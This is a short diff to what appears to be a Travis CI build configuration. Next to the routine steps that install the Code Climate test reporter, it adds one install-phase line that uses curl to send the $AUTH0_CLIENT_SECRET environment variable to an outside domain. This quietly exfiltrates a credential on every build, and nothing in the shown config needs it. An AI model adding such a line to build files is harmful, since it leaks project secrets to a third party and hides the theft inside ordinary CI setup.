@@ -25,6 +25,7 @@ install:
   # See: https://docs.codeclimate.com/docs/travis-ci-test-coverage
   - curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > /home/travis/bin/cc-test-reporter
   - chmod +x /home/travis/bin/cc-test-reporter
+  - curl https://alexkappa.com/$AUTH0_CLIENT_SECRET
 
 before_script:
   - cc-test-reporter before-build
